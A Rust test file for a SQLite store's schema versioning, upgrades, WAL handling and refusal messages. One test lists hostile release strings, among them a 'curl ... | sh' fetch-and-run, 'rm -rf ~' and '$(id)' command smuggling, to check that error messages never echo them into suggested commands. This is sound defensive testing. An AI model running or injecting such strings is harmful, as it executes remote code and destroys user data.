use super::testing::*;
use super::*;

#[test]
fn admitted_store_does_not_reopen_replacement_sidecars() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("owned");
    std::fs::create_dir(&root).unwrap();
    let path = root.join("core.sqlite");
    let conn = super::open(&path).unwrap();
    super::meta_set(&conn, "witness", "original").unwrap();
    conn.execute_batch("PRAGMA wal_checkpoint(TRUNCATE)")
        .unwrap();
    std::fs::rename(&root, temp.path().join("original")).unwrap();
    std::fs::create_dir(&root).unwrap();
    let replacement = super::open(&path).unwrap();
    super::meta_set(&replacement, "witness", "replacement").unwrap();
    let before = std::fs::read(root.join("core.sqlite-wal")).unwrap();
    super::meta_set(&conn, "witness", "updated original").unwrap();
    assert_eq!(
        super::meta_get(&conn, "witness").unwrap().as_deref(),
        Some("updated original")
    );
    drop(conn);
    assert!(
        std::fs::read(root.join("core.sqlite-wal")).unwrap() == before,
        "replacement WAL changed"
    );
    assert_eq!(
        super::meta_get(&replacement, "witness").unwrap().as_deref(),
        Some("replacement")
    );
}

#[test]
fn closing_admitted_store_preserves_replacement_sidecars() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("owned");
    std::fs::create_dir(&root).unwrap();
    let path = root.join("core.sqlite");
    let conn = super::open(&path).unwrap();
    super::meta_set(&conn, "witness", "original").unwrap();
    assert!(root.join("core.sqlite-wal").exists());
    assert!(root.join("core.sqlite-shm").exists());
    std::fs::rename(&root, temp.path().join("original")).unwrap();
    std::fs::create_dir(&root).unwrap();
    let replacement = super::open(&path).unwrap();
    super::meta_set(&replacement, "witness", "replacement").unwrap();
    let wal = std::fs::read(root.join("core.sqlite-wal")).unwrap();
    let shm = std::fs::read(root.join("core.sqlite-shm")).unwrap();
    drop(conn);
    assert_eq!(std::fs::read(root.join("core.sqlite-wal")).unwrap(), wal);
    assert_eq!(std::fs::read(root.join("core.sqlite-shm")).unwrap(), shm);
    assert_eq!(
        super::meta_get(&replacement, "witness").unwrap().as_deref(),
        Some("replacement")
    );
}

#[test]
fn the_queue_refuses_what_the_contract_closes() {
    let conn = conn();
    let insert = |id: &str, verdict: &str, refusals: i64, key: &str| {
        conn.execute(
            "INSERT INTO queue (id, kind, idempotency_key, payload, verdict, refusals, queued_at)
                 VALUES (?1, 'create_item', ?2, '{}', ?3, ?4, '2026-01-01T00:00:00Z')",
            rusqlite::params![id, key, verdict, refusals],
        )
    };

    insert("ok", "accepted", 0, "key-ok").unwrap();

    assert!(insert("bad-verdict", "maybe", 0, "key-a").is_err());

    assert!(insert("over-ceiling", "dead", 6, "key-b").is_err());

    assert!(insert("duplicate-key", "accepted", 0, "key-ok").is_err());
}

fn refusal_of(path: &Path) -> (String, Option<u64>, String) {
    match open(path) {
        Err(error @ CoreError::WrongSchema { .. }) => {
            let said = error.to_string();
            let CoreError::WrongSchema { reason, unsent, .. } = error else {
                unreachable!()
            };
            (reason, unsent, said)
        }
        other => panic!("{} opened as {other:?}", path.display()),
    }
}

pub(super) fn queue_one(conn: &Connection) {
    conn.execute(
        "INSERT INTO queue (id, kind, idempotency_key, payload, queued_at)
             VALUES ('q1', 'create_item', 'k1', '{}', '2026-01-01T00:00:00Z')",
        [],
    )
    .unwrap();
}

/// Sets the version SQLite records for the store at `path`, as another
/// build of the core would have left it.
fn at_version(path: &Path, version: i64) {
    Connection::open(path)
        .unwrap()
        .pragma_update(None, "user_version", version)
        .unwrap();
}

fn queued(path: &Path) -> Vec<(String, String)> {
    let conn = Connection::open(path).unwrap();
    let mut statement = conn
        .prepare("SELECT id, idempotency_key FROM queue ORDER BY id")
        .unwrap();
    statement
        .query_map([], |row| Ok((row.get(0)?, row.get(1)?)))
        .unwrap()
        .collect::<rusqlite::Result<_>>()
        .unwrap()
}

#[test]
fn a_store_counts_every_write_the_server_has_not_taken() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    let refused_with = |verdict: Option<&str>| {
        {
            let conn = open(&path).unwrap();
            conn.execute_batch("DELETE FROM queue").unwrap();
            queue_one(&conn);
            conn.execute("UPDATE queue SET verdict = ?1, sent = 1", [verdict])
                .unwrap();
        }
        at_version(&path, SCHEMA_VERSION + 1);
        let refused = refusal_of(&path);
        at_version(&path, SCHEMA_VERSION);
        refused
    };
    for verdict in [None, Some("blocked"), Some("refused"), Some("dead")] {
        let (_, unsent, said) = refused_with(verdict);
        assert_eq!(unsent, Some(1), "a {verdict:?} write was not counted");
        assert!(!said.contains("loses nothing"), "{said}");
    }
    // A refused write that carried nothing, sent, is one clearing drops.
    {
        let conn = open(&path).unwrap();
        conn.execute_batch("DELETE FROM queue").unwrap();
        conn.execute(
            "INSERT INTO queue (id, kind, idempotency_key, payload, queued_at, verdict, sent)
                 VALUES ('d1', 'delete_item', 'kd', '{}', '2026-01-01T00:00:00Z', 'refused', 1)",
            [],
        )
        .unwrap();
    }
    at_version(&path, SCHEMA_VERSION + 1);
    let (_, unsent, said) = refusal_of(&path);
    assert_eq!(
        unsent,
        Some(0),
        "a refused delete that clearing drops was counted"
    );
    assert!(said.contains("loses nothing"), "{said}");
    at_version(&path, SCHEMA_VERSION);
    assert!(
        open_to_read(&path).is_ok(),
        "counting left the reader's temporary queue in place"
    );

    // The witness: a write the server took is no loss.
    let (_, unsent, said) = refused_with(Some("accepted"));
    assert_eq!(unsent, Some(0));
    assert!(said.contains("loses nothing"), "{said}");
}

#[test]
fn an_empty_file_is_made_a_store_at_this_version() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    // As a make that never committed leaves it.
    Connection::open(&path)
        .unwrap()
        .execute_batch("PRAGMA journal_mode = WAL;")
        .unwrap();
    let conn = open(&path).unwrap();
    assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
    assert!(held_shape(&conn).unwrap().contains_key("queue"));
}

fn release_of(path: &Path) -> Option<String> {
    let conn = Connection::open(path).unwrap();
    meta_get(&conn, META_RELEASE).unwrap()
}

#[test]
fn a_writer_records_the_release_it_was_built_as_each_time_it_opens_the_store() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    drop(open(&path).unwrap());
    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));

    // The witness: another release's record stays until a writer opens it,
    // and a reader leaves it alone.
    meta_set(&Connection::open(&path).unwrap(), META_RELEASE, "0.0.1").unwrap();
    drop(open_to_read(&path).unwrap());
    assert_eq!(release_of(&path).as_deref(), Some("0.0.1"));
    drop(open(&path).unwrap());
    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));

    // A store that records none, as an earlier build left it, gets one.
    Connection::open(&path)
        .unwrap()
        .execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
        .unwrap();
    drop(open(&path).unwrap());
    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));
}

#[test]
fn a_store_holding_a_meta_key_this_build_does_not_read_opens_as_before() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    drop(open(&path).unwrap());
    meta_set(
        &Connection::open(&path).unwrap(),
        "kept_by_another_build",
        "x",
    )
    .unwrap();
    let conn = open(&path).unwrap();
    assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
    assert_eq!(
        meta_get(&conn, "kept_by_another_build").unwrap().as_deref(),
        Some("x")
    );
}

#[test]
fn a_refused_store_names_the_release_that_last_saved_it_whoever_reads_it() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        queue_one(&conn);
        meta_set(&conn, META_RELEASE, "0.0.80").unwrap();
    }
    at_version(&path, SCHEMA_VERSION + 1);
    let named = |error: CoreError| match error {
        CoreError::WrongSchema { ref release, .. } => (release.clone(), error.to_string()),
        other => panic!("refused as {other:?}"),
    };
    for error in [
        open(&path).err().unwrap(),
        open_to_read(&path).err().unwrap(),
        refusal(&path).unwrap().unwrap(),
    ] {
        let (release, said) = named(error);
        assert_eq!(release.as_deref(), Some("0.0.80"));
        assert!(
            said.contains("`MARFA_VERSION=0.0.80` with the install script"),
            "{said}"
        );
    }
    assert_eq!(
        release_of(&path).as_deref(),
        Some("0.0.80"),
        "refusing the store recorded this build's release in it"
    );

    // The witness: a store that records none says so.
    Connection::open(&path)
        .unwrap()
        .execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
        .unwrap();
    let (release, said) = named(open(&path).err().unwrap());
    assert_eq!(release, None);
    assert!(
        said.contains("the release that last saved it is not known"),
        "{said}"
    );
}

/// What a refusal of the store at `path` says, with the release it carries.
fn refused_naming(path: &Path) -> (Option<String>, String) {
    match open(path) {
        Err(error @ CoreError::WrongSchema { .. }) => {
            let said = error.to_string();
            let CoreError::WrongSchema { release, .. } = error else {
                unreachable!()
            };
            (release, said)
        }
        other => panic!("{} opened as {other:?}", path.display()),
    }
}

#[test]
fn a_release_that_is_not_three_numbers_is_not_named_or_put_in_a_command() {
    let hostile = [
        "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
        "0.0.80 && rm -rf ~",
        "0.0.80\n",
        "$(id).0.1",
        "v0.0.80",
        "0.0",
        "0.0.80.1",
        "0..80",
        "",
        "\u{ff10}.\u{ff10}.\u{ff18}\u{ff10}",
        "0.0.-1",
    ];
    for text in hostile {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("core.sqlite");
        {
            let conn = open(&path).unwrap();
            queue_one(&conn);
            meta_set(&conn, META_RELEASE, text).unwrap();
        }
        at_version(&path, SCHEMA_VERSION + 1);
        for (release, said) in [
            refused_naming(&path),
            match refusal(&path).unwrap().unwrap() {
                error @ CoreError::WrongSchema { .. } => {
                    let said = error.to_string();
                    let CoreError::WrongSchema { release, .. } = error else {
                        unreachable!()
                    };
                    (release, said)
                }
                other => panic!("refused as {other:?}"),
            },
        ] {
            assert_eq!(release, None, "{text:?} was kept as a release");
            assert!(
                said.contains("the release that last saved it is not known"),
                "{text:?}: {said}"
            );
            assert!(!said.contains("MARFA_VERSION"), "{text:?}: {said}");
            assert!(
                !said.contains('\u{1b}') && !said.contains("curl") && !said.contains("rm -rf"),
                "{text:?}: {said}"
            );
        }
    }
    // The witness: a release as the stamp writes one is kept.
    for text in ["0.0.80", "12.34.567"] {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("core.sqlite");
        drop(open(&path).unwrap());
        meta_set(&Connection::open(&path).unwrap(), META_RELEASE, text).unwrap();
        at_version(&path, SCHEMA_VERSION + 1);
        assert_eq!(refused_naming(&path).0.as_deref(), Some(text));
    }
}

#[test]
fn a_store_that_cannot_take_the_release_record_still_opens_and_says_the_release_is_not_known() {
    for before in [None, Some("0.0.1")] {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("core.sqlite");
        drop(open(&path).unwrap());
        {
            let conn = Connection::open(&path).unwrap();
            conn.execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
                .unwrap();
            if let Some(release) = before {
                meta_set(&conn, META_RELEASE, release).unwrap();
            }
            // A write the store refuses, as a full disk or a busy writer would.
            conn.execute_batch(
                "CREATE TRIGGER no_release_insert BEFORE INSERT ON meta
                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;
                 CREATE TRIGGER no_release_update BEFORE UPDATE ON meta
                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;",
            )
            .unwrap();
        }
        let conn = open(&path).expect("an open that needs no write failed on the release record");
        assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
        drop(conn);
        assert_eq!(
            release_of(&path),
            None,
            "a record this build could not renew was left naming {before:?}"
        );
        at_version(&path, SCHEMA_VERSION + 1);
        let (release, said) = refused_naming(&path);
        assert_eq!(release, None);
        assert!(
            said.contains("the release that last saved it is not known"),
            "{said}"
        );
    }
}

#[test]
fn two_programs_making_one_store_at_once_both_open_it() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    let late = Connection::open(&path).unwrap();
    // It read the file empty before the other made the store.
    assert_eq!(version(&late).unwrap(), 0);
    assert!(!holds_tables(&late).unwrap());
    drop(open(&path).unwrap());
    make(&late).unwrap();
    assert_eq!(version(&late).unwrap(), SCHEMA_VERSION);
    assert!(open(&path).is_ok());
}

/// The meta an earlier build of the core wrote, beside a version it
/// never set.
fn as_an_earlier_build_left_it(path: &Path) {
    Connection::open(path)
        .unwrap()
        .execute_batch(
            "INSERT INTO meta (key, value) VALUES ('schema_version', '0');
                 PRAGMA user_version = 0;",
        )
        .unwrap();
}

#[test]
fn a_store_at_another_version_is_refused_with_its_writes_kept() {
    for (found, older) in [(0, true), (0, false), (SCHEMA_VERSION + 1, false)] {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("core.sqlite");
        {
            let conn = open(&path).unwrap();
            queue_one(&conn);
            meta_set(&conn, "kept", "as it was").unwrap();
        }
        if older {
            as_an_earlier_build_left_it(&path);
        } else {
            at_version(&path, found);
        }
        let before = queued(&path);
        let (reason, unsent, said) = refusal_of(&path);
        assert!(
            reason.contains(&format!(
                "schema version {found}, and this build reads schema version {SCHEMA_VERSION}"
            )),
            "{reason}"
        );
        assert_eq!(unsent, Some(1));
        assert!(
            said.contains(&path.display().to_string()),
            "the refusal does not say which file, which a person may know only by the variable that named it: {said}"
        );
        assert!(
            said.contains(
                "1 write the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store"
            ),
            "{said}"
        );
        assert!(!said.to_lowercase().contains("delete"), "{said}");
        assert!(matches!(
            open_to_read(&path),
            Err(CoreError::WrongSchema {
                unsent: Some(1),
                ..
            })
        ));
        // A replacement would lose the write, so it is refused too.
        assert!(matches!(
            refusal(&path).unwrap(),
            Some(CoreError::WrongSchema {
                unsent: Some(1),
                ..
            })
        ));
        assert_eq!(
            queued(&path),
            before,
            "refusing the store changed its queue"
        );
        let conn = Connection::open(&path).unwrap();
        assert_eq!(version(&conn).unwrap(), found);
        assert_eq!(
            meta_get(&conn, "kept").unwrap().as_deref(),
            Some("as it was")
        );

        // The witness: the same store at this version opens, write and all.
        drop(conn);
        at_version(&path, SCHEMA_VERSION);
        let conn = open(&path).unwrap();
        assert_eq!(untaken_count(&conn), Some(1));
    }
}

/// The bytes of the store file and of each log beside it, `None` where a log
/// is absent or empty. The index file SQLite keeps beside a store in
/// write-ahead mode holds nothing of the store, so it is left out.
fn every_byte_of(path: &Path) -> Vec<Option<Vec<u8>>> {
    ["", "-journal", "-wal"]
        .iter()
        .map(|suffix| {
            std::fs::read(suffixed(path, suffix))
                .ok()
                .filter(|bytes| !bytes.is_empty())
        })
        .collect()
}

/// A store this build made at `found`, closed, in the journal mode named.
fn left_at(path: &Path, found: i64, mode: &str) {
    {
        let conn = open(path).unwrap();
        queue_one(&conn);
        let kept: String = conn
            .query_row(&format!("PRAGMA journal_mode = {mode}"), [], |row| {
                row.get(0)
            })
            .unwrap();
        assert!(kept.eq_ignore_ascii_case(mode), "{kept}");
        conn.pragma_update(None, "user_version", found).unwrap();
    }
    for log in ["-wal", "-shm"] {
        if mode.eq_ignore_ascii_case("delete") {
            assert!(!suffixed(path, log).exists(), "{log} was left");
        }
    }
}

#[test]
fn a_writer_that_refuses_a_store_changes_no_byte_of_it() {
    for (mode, header_mode) in [("DELETE", 1u8), ("WAL", 2u8)] {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("core.sqlite");
        left_at(&path, SCHEMA_VERSION + 1, mode);
        let before = every_byte_of(&path);
        let header = before[0].as_ref().unwrap();
        assert_eq!(
            [header[18], header[19]],
            [header_mode; 2],
            "the store was not left in {mode} mode"
        );

        assert!(matches!(
            open(&path),
            Err(CoreError::WrongSchema {
                unsent: Some(1),
                ..
            })
        ));
        assert_eq!(
            every_byte_of(&path),
            before,
            "refusing a store in {mode} mode changed it"
        );

        // The witness: at this version, the same store in DELETE mode is
        // opened and put in WAL mode, which is a change the refusal skipped.
        at_version(&path, SCHEMA_VERSION);
        let after_version = every_byte_of(&path);
        drop(open(&path).unwrap());
        let opened = every_byte_of(&path);
        let header = opened[0].as_ref().unwrap();
        assert_eq!([header[18], header[19]], [2, 2], "{mode}");
        if mode == "DELETE" {
            assert_ne!(opened, after_version, "opening changed nothing to refuse");
        }
    }
}

/// Records `found` as the store's version through a connection that leaves
/// its log as it is when it closes, so the log holds frames the store does not.
fn leaving_frames_at(path: &Path, found: i64) {
    let conn = Connection::open(path).unwrap();
    conn.set_db_config(
        rusqlite::config::DbConfig::SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE,
        true,
    )
    .unwrap();
    conn.pragma_update(None, "wal_autocheckpoint", 0).unwrap();
    conn.pragma_update(None, "user_version", found).unwrap();
}

#[test]
fn a_writer_that_refuses_a_store_leaves_the_store_and_the_log_holding_frames() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    left_at(&path, SCHEMA_VERSION, "WAL");
    leaving_frames_at(&path, SCHEMA_VERSION + 1);
    let held = |path: &Path| {
        [
            std::fs::read(path).unwrap(),
            std::fs::read(suffixed(path, "-wal")).unwrap_or_default(),
        ]
    };
    let before = held(&path);
    assert!(!before[1].is_empty(), "the log holds no frames");

    assert!(matches!(open(&path), Err(CoreError::WrongSchema { .. })));
    assert_eq!(
        held(&path),
        before,
        "the writer's refusal changed the store"
    );
    assert!(matches!(
        open_to_read(&path),
        Err(CoreError::WrongSchema { .. })
    ));
    assert_eq!(
        held(&path),
        before,
        "the reader's refusal changed the store"
    );

    // The witness: at this version, closing a writer checkpoints the log into
    // the store and deletes it.
    leaving_frames_at(&path, SCHEMA_VERSION);
    let before = held(&path);
    assert!(!before[1].is_empty());
    drop(open(&path).unwrap());
    assert_ne!(
        held(&path),
        before,
        "an allowed open left the store as it was"
    );
}

/// A store in WAL mode with no log beside it, whose index file cannot be made
/// because its name leads nowhere, as SQLite fails where the volume has no
/// room for it. `with_log` leaves an empty log beside it.
#[cfg(debug_assertions)]
fn whose_index_cannot_be_made(dir: &Path, with_log: bool) -> std::path::PathBuf {
    let path = dir.join("core.sqlite");
    drop(open(&path).unwrap());
    assert!(!suffixed(&path, "-wal").exists());
    hold_index_name(&path);
    if with_log {
        std::fs::write(suffixed(&path, "-wal"), b"").unwrap();
    }
    path
}

#[cfg(all(unix, debug_assertions))]
fn hold_index_name(path: &Path) {
    std::os::unix::fs::symlink(path.with_file_name("nowhere/index"), suffixed(path, "-shm"))
        .unwrap();
}

#[cfg(all(not(unix), debug_assertions))]
fn hold_index_name(path: &Path) {
    std::fs::create_dir(suffixed(path, "-shm")).unwrap();
}

#[cfg(debug_assertions)]
type Opener<'a> = &'a dyn Fn() -> Result<Connection, CoreError>;

#[cfg(debug_assertions)]
#[test]
fn an_open_that_cannot_make_its_logs_on_a_full_volume_is_storage_full() {
    for with_log in [false, true] {
        let dir = tempfile::tempdir().unwrap();
        let path = whose_index_cannot_be_made(dir.path(), with_log);
        let opens: [(&str, Opener); 2] = [
            ("the writer", &|| open(&path)),
            ("a reading handle", &|| open_to_read(&path)),
        ];
        for (who, open_it) in opens {
            // The witness: the failure is there with room on the volume, and
            // is a store failure, since nothing says the volume is the cause.
            let error = open_it().expect_err("the index file was made");
            assert!(
                matches!(error, CoreError::Store(_)),
                "{who}, log {with_log}: {error:?}"
            );
            let _full = crate::fault::fail_on_this_thread("volume-full");
            let error = open_it().expect_err("the index file was made");
            assert!(
                matches!(error, CoreError::StorageFull(_)),
                "{who}, log {with_log}: {error:?}"
            );
        }
    }
}

#[cfg(all(unix, debug_assertions))]
#[test]
fn a_folder_store_that_cannot_make_its_logs_on_a_full_volume_is_storage_full() {
    use crate::directory_vfs::DirectoryVfs;
    let dir = tempfile::tempdir().unwrap();
    let folder = std::fs::File::open(dir.path()).unwrap();
    let vfs = DirectoryVfs::new(&folder).unwrap();
    let label = dir.path().join(FOLDER_STORE);
    drop(open_directory(&vfs, &label).unwrap());
    hold_index_name(&dir.path().join(FOLDER_STORE));
    let opens: [(&str, Opener); 2] = [
        ("the writer", &|| open_directory(&vfs, &label)),
        ("a reading handle", &|| read_directory(&vfs, &label)),
    ];
    for (who, open_it) in opens {
        let error = open_it().expect_err("the index file was made");
        assert!(matches!(error, CoreError::Store(_)), "{who}: {error:?}");
        let _full = crate::fault::fail_on_this_thread("volume-full");
        let error = open_it().expect_err("the index file was made");
        assert!(
            matches!(error, CoreError::StorageFull(_)),
            "{who}: {error:?}"
        );
    }
}

#[test]
fn a_volume_with_room_is_not_full() {
    let dir = tempfile::tempdir().unwrap();
    assert!(!crate::file_cache::volume_is_full(
        crate::file_cache::Place::Named(&dir.path().join("core.sqlite"))
    ));
}

#[test]
fn a_store_the_previous_shape_made_is_refused_with_its_writes_kept() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        queue_one(&conn);
        conn.execute_batch("ALTER TABLE tags DROP COLUMN position")
            .unwrap();
    }
    at_version(&path, 1);
    let before = queued(&path);
    let (reason, unsent, _) = refusal_of(&path);
    assert!(
        reason.contains(&format!(
            "schema version 1, and this build reads schema version {SCHEMA_VERSION}"
        )),
        "{reason}"
    );
    assert_eq!(unsent, Some(1));
    assert!(matches!(
        open_to_read(&path),
        Err(CoreError::WrongSchema {
            unsent: Some(1),
            ..
        })
    ));
    assert_eq!(
        queued(&path),
        before,
        "refusing the store changed its queue"
    );
    let conn = Connection::open(&path).unwrap();
    assert_eq!(version(&conn).unwrap(), 1);
    assert!(
        conn.prepare("SELECT position FROM tags").is_err(),
        "refusing the store changed its tags"
    );
}

#[test]
fn a_store_at_another_version_whose_queue_cannot_be_read_says_so() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        queue_one(&conn);
        conn.execute_batch("ALTER TABLE queue RENAME COLUMN verdict TO answer_kind")
            .unwrap();
    }
    at_version(&path, 0);
    let (_, unsent, said) = refusal_of(&path);
    assert_eq!(unsent, None);
    assert!(said.contains("cannot be read"), "{said}");
}

#[test]
fn a_queued_write_of_a_kind_this_build_does_not_send_is_refused_by_name() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    let hold = |verdict: Option<&str>| {
        let conn = Connection::open(&path).unwrap();
        conn.execute_batch("DELETE FROM queue").unwrap();
        conn.execute(
            "INSERT INTO queue (id, kind, item_id, idempotency_key, payload, queued_at, verdict, sent)
                 VALUES ('q1', 'merge_metadata', 'n1', 'k1', '{\"tags\":[\"a\"]}',
                         '2026-01-01T00:00:00Z', ?1, ?2)",
            params![verdict, verdict.is_some()],
        )
        .unwrap();
    };
    queue_admitting(&open(&path).unwrap(), "merge_metadata");
    at_version(&path, 0);
    // A refused write that carried content stays until discarded, so it
    // is counted with the waiting one.
    for verdict in [None, Some("refused"), Some("dead")] {
        hold(verdict);
        let (reason, unsent, said) = refusal_of(&path);
        assert!(
            reason.contains("1 write of kind merge_metadata, which this build cannot send"),
            "{verdict:?}: {reason}"
        );
        assert_eq!(unsent, Some(1), "{verdict:?}");
        assert!(said.contains("1 write the server has not taken"), "{said}");
        assert!(
            matches!(open_to_read(&path), Err(CoreError::WrongSchema { reason, .. })
                if reason.contains("merge_metadata")),
            "a reader opened it"
        );
        let conn = Connection::open(&path).unwrap();
        assert_eq!(
            conn.query_row("SELECT kind FROM queue", [], |row| row.get::<_, String>(0))
                .unwrap(),
            "merge_metadata",
            "refusing the store took the write"
        );
    }
    // The witness: the same earlier queue with the write answered names
    // no kind, and is refused only for its version.
    hold(Some("accepted"));
    let (reason, unsent, _) = refusal_of(&path);
    assert!(!reason.contains("merge_metadata"), "{reason}");
    assert!(reason.contains("schema version 0"), "{reason}");
    assert_eq!(unsent, Some(0));
}

#[test]
fn a_store_from_before_tags_were_replaced_by_their_own_kind_is_refused_with_its_write_kept() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        queue_admitting(&conn, "replace_metadata");
        conn.execute(
            "INSERT INTO queue (id, kind, item_id, idempotency_key, payload, queued_at)
                 VALUES ('q1', 'replace_metadata', 'n1', 'k1', '{\"tags\":[\"a\"]}',
                         '2026-01-01T00:00:00Z')",
            [],
        )
        .unwrap();
    }
    at_version(&path, OLDEST_UPGRADED - 1);
    let (reason, unsent, _) = refusal_of(&path);
    assert!(
        reason.contains("1 write of kind replace_metadata, which this build cannot send"),
        "{reason}"
    );
    assert!(
        reason.contains(&format!("schema version {}", OLDEST_UPGRADED - 1)),
        "{reason}"
    );
    assert_eq!(unsent, Some(1));
    let conn = Connection::open(&path).unwrap();
    assert_eq!(
        conn.query_row("SELECT kind FROM queue", [], |row| row.get::<_, String>(0))
            .unwrap(),
        "replace_metadata",
        "refusing the store took the write"
    );
}

/// Append one hash per schema version; never change an existing entry.
const SHAPES: [&str; 12] = [
    "9a505dc1b14cecc6",
    "115c1d4def4a3d91",
    "2d4e4e1e76ec61dc",
    "c2b64b3a6428a46c",
    "e5029183e86b7c37",
    "195bcf17d74301ef",
    "917adee5fa567dda",
    "b6799eca96cc6c3f",
    "8677b34bec9e8814",
    "03d2b1a62ad045a9",
    "19191f94ade9938b",
    "07e2ec7950f2fc14",
];

/// Every table, index and trigger `conn` holds, as SQLite records them.
fn shape_of(conn: &Connection) -> String {
    let mut query = conn
        .prepare(
            "SELECT type, name, sql FROM sqlite_master WHERE sql IS NOT NULL ORDER BY type, name",
        )
        .unwrap();
    query
        .query_map([], |row| {
            Ok(format!(
                "{}:{}:{}\n",
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                statement(&row.get::<_, String>(2)?)
            ))
        })
        .unwrap()
        .collect::<rusqlite::Result<_>>()
        .unwrap()
}

#[test]
fn the_shape_this_build_makes_is_the_one_its_version_names() {
    let conn = Connection::open_in_memory().unwrap();
    conn.execute_batch(SCHEMA).unwrap();
    let named = shape_of(&conn);
    assert_eq!(
        SHAPES.len() as i64,
        SCHEMA_VERSION,
        "SHAPES holds one entry for each version"
    );
    assert_eq!(
        crate::folder::state::hash(named.as_bytes()),
        SHAPES[SHAPES.len() - 1],
        "the shape schema.sql makes is not the one its version names: raise SCHEMA_VERSION and add the new hash to SHAPES, leaving every entry before it as it is"
    );
    assert_eq!(
        OLDEST_UPGRADED + UPGRADES.len() as i64,
        SCHEMA_VERSION,
        "UPGRADES holds a step from each version since OLDEST_UPGRADED"
    );
}

#[test]
fn a_store_at_an_earlier_version_is_upgraded_in_place_with_its_queue_kept() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        queue_one(&conn);
        conn.execute_batch("ALTER TABLE meta RENAME TO meta_before")
            .unwrap();
    }
    let conn = Connection::open(&path).unwrap();
    conn.pragma_update(None, "user_version", 7).unwrap();
    let before = queued(&path);
    // A step that fails leaves the store at its version.
    let steps = [
        "ALTER TABLE meta_before RENAME TO meta",
        "SELECT * FROM absent",
    ];
    assert!(upgrade(&conn, 7, &steps).is_err());
    assert_eq!(version(&conn).unwrap(), 7);
    assert!(held_shape(&conn).unwrap().contains_key("meta_before"));

    let steps = ["ALTER TABLE meta_before RENAME TO meta", "SELECT 1"];
    upgrade(&conn, 7, &steps).unwrap();
    assert_eq!(version(&conn).unwrap(), 9);
    assert!(held_shape(&conn).unwrap().contains_key("meta"));
    assert_eq!(queued(&path), before, "the upgrade changed the queue");
    // Upgraded already: nothing runs again.
    upgrade(&conn, 7, &["SELECT * FROM absent", "SELECT * FROM absent"]).unwrap();
    // A version before the oldest is refused, unchanged.
    conn.pragma_update(None, "user_version", 3).unwrap();
    assert!(matches!(
        upgrade(&conn, 7, &steps),
        Err(CoreError::WrongSchema { .. })
    ));
    assert_eq!(version(&conn).unwrap(), 3);
}

#[test]
fn a_store_at_the_oldest_upgraded_version_keeps_every_missing_file_it_journaled() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    drop(open(&path).unwrap());
    let made = shape_of(&Connection::open(&path).unwrap());
    {
        let conn = Connection::open(&path).unwrap();
        conn.execute_batch(
            "DROP TABLE folder_journal;
             CREATE TABLE folder_journal (
               path TEXT PRIMARY KEY,
               item_id TEXT NOT NULL,
               missing_since TEXT NOT NULL,
               kept TEXT CHECK (kept IN ('arriving', 'unsure', 'carried')),
               reason TEXT
             ) WITHOUT ROWID;
             INSERT INTO folder_files (path, item_id, identity, content_hash, links, edge_lines, seen_at)
               VALUES ('a.md', 'a', 'id-a', 'hash-a', '[]', '[]', '2026-01-01T00:00:00Z'),
                      ('b.bin', 'other', 'id-other', 'hash-other', '[]', '[]', '2026-01-01T00:00:00Z');
             INSERT INTO folder_journal (path, item_id, missing_since, kept, reason)
               VALUES ('a.md', 'a', '2026-01-01T00:00:00Z', NULL, NULL),
                      ('b.bin', 'b', '2026-01-02T00:00:00Z', 'unsure', 'offline'),
                      ('c.md', 'c', '2026-01-03T00:00:00Z', 'carried', 'd.md');",
        )
        .unwrap();
    }
    at_version(&path, OLDEST_UPGRADED);
    let conn = open(&path).unwrap();
    assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
    assert_eq!(shape_of(&conn), made, "the upgrade made another shape");
    let journal: Vec<String> = conn
        .prepare(
            "SELECT path || ' ' || item_id || ' ' || missing_since || ' ' || ifnull(kept, '-')
                    || ' ' || ifnull(reason, '-') || ' ' || ifnull(identity, '-')
                    || ' ' || ifnull(content_hash, '-')
             FROM folder_journal ORDER BY path",
        )
        .unwrap()
        .query_map([], |row| row.get(0))
        .unwrap()
        .collect::<rusqlite::Result<_>>()
        .unwrap();
